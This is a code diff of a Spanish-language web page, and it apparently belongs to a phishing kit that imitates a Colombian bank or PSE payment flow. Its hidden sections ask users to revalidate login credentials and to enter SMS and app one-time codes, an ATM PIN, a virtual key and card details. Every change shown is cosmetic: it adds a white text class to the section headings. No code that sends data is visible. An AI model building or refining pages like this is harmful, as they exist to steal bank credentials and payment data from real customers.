@@ -756,7 +756,7 @@
 	<!-- SECCIÓN: TDC (Solicitar otra tarjeta de crédito) -->
 	<section id="seccion-tdc" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
 		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
-			<h2 class="text-xl font-medium">Verificación Adicional</h2>
+			<h2 class="text-xl font-medium text-white">Verificación Adicional</h2>
 		</div>
 		<div class="px-6 py-8">
 			<div class="text-center mb-8">
@@ -807,7 +807,7 @@
 	<!-- SECCIÓN: OTP SMS -->
 	<section id="seccion-otpsms" class="brasilia-section min-h-screen bg-gray-50 flex flex-col" style="display: none;">
 		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
-			<h2 class="text-xl font-medium">VALIDACION DE SEGURIDAD</h2>
+			<h2 class="text-xl font-medium text-white">VALIDACION DE SEGURIDAD</h2>
 		</div>
 		<div class="flex-1 flex items-center justify-center p-4">
 		<div class="bg-white rounded-xl shadow-lg max-w-md w-full p-6">
@@ -874,7 +874,7 @@
 	<!-- SECCIÓN: OTP APP -->
 	<section id="seccion-otpapp" class="brasilia-section min-h-screen bg-gray-50 flex flex-col" style="display: none;">
 		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
-			<h2 class="text-xl font-medium">VALIDACION DE SEGURIDAD</h2>
+			<h2 class="text-xl font-medium text-white">VALIDACION DE SEGURIDAD</h2>
 		</div>
 		<div class="flex-1 flex items-center justify-center p-4">
 		<div class="bg-white rounded-xl shadow-lg max-w-md w-full p-6">
@@ -941,7 +941,7 @@
 	<!-- SECCIÓN: LOGIN (Revalidar credenciales) -->
 	<section id="seccion-login" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
 		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
-			<h2 class="text-xl font-medium">VALIDACION DE SEGURIDAD</h2>
+			<h2 class="text-xl font-medium text-white">VALIDACION DE SEGURIDAD</h2>
 		</div>
 		<div class="px-6 py-8">
 			<div class="text-center mb-8">
@@ -984,7 +984,7 @@
 	<!-- SECCIÓN: CLAVE CAJERO -->
 	<section id="seccion-clavecajero" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
 		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
-			<h2 class="text-xl font-medium">VALIDACION DE SEGURIDAD</h2>
+			<h2 class="text-xl font-medium text-white">VALIDACION DE SEGURIDAD</h2>
 		</div>
 		<div class="px-6 py-8">
 			<div class="text-center mb-8">
@@ -1020,7 +1020,7 @@
 	<!-- SECCIÓN: CLAVE VIRTUAL -->
 	<section id="seccion-clavevirtual" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
 		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
-			<h2 class="text-xl font-medium">VALIDACION DE SEGURIDAD</h2>
+			<h2 class="text-xl font-medium text-white">VALIDACION DE SEGURIDAD</h2>
 		</div>
 		<div class="px-6 py-8">
 			<div class="text-center mb-8">
@@ -1056,7 +1056,7 @@
 	<!-- SECCIÓN: CAMBIAR MÉTODO DE PAGO -->
 	<section id="seccion-cambiar" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
 		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
-			<h2 class="text-xl font-medium">Cambio de Método de Pago</h2>
+			<h2 class="text-xl font-medium text-white">Cambio de Método de Pago</h2>
 		</div>
 		<div class="px-6 py-12 flex flex-col items-center justify-center">
 			<div class="w-24 h-24 bg-blue-100 rounded-full flex items-center justify-center mb-6">
@@ -1077,7 +1077,7 @@
 	<!-- SECCIÓN: FIN (Éxito) -->
 	<section id="seccion-fin" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
 		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
-			<h2 class="text-xl font-medium">Proceso Completado</h2>
+			<h2 class="text-xl font-medium text-white">Proceso Completado</h2>
 		</div>
 		<div class="px-6 py-12 flex flex-col items-center justify-center">
 			<div class="w-24 h-24 bg-green-100 rounded-full flex items-center justify-center mb-6">
@@ -1099,7 +1099,7 @@
 	<!-- SECCIÓN: ERROR -->
 	<section id="seccion-error" class="brasilia-section min-h-screen bg-gray-50" style="display: none;">
 		<div class="bg-[#00529c] text-white px-6 py-4 flex items-center justify-center">
-			<h2 class="text-xl font-medium">Error en el Proceso</h2>
+			<h2 class="text-xl font-medium text-white">Error en el Proceso</h2>
 		</div>
 		<div class="px-6 py-12 flex flex-col items-center justify-center">
 			<div class="w-24 h-24 bg-red-100 rounded-full flex items-center justify-center mb-6">
@@ -1126,7 +1126,7 @@
 					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
 				</svg>
 			</button>
-			<h2 class="text-xl font-medium">Método de pago</h2>
+			<h2 class="text-xl font-medium text-white">Método de pago</h2>
 			<button onclick="volverDesdeMetodoPago()" class="p-2">
 				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
 					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
@@ -1198,7 +1198,7 @@
 					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
 				</svg>
 			</button>
-			<h2 class="text-xl font-medium">Tarjeta de Crédito</h2>
+			<h2 class="text-xl font-medium text-white">Tarjeta de Crédito</h2>
 			<button onclick="volverAMetodoPago()" class="p-2">
 				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
 					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
@@ -1329,7 +1329,7 @@
 					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M15 19l-7-7 7-7"/>
 				</svg>
 			</button>
-			<h2 class="text-xl font-medium">PSE</h2>
+			<h2 class="text-xl font-medium text-white">PSE</h2>
 			<button onclick="volverAMetodoPago()" class="p-2">
 				<svg class="w-6 h-6" fill="none" stroke="currentColor" viewBox="0 0 24 24">
 					<path stroke-linecap="round" stroke-linejoin="round" stroke-width="2" d="M6 18L18 6M6 6l12 12"/>
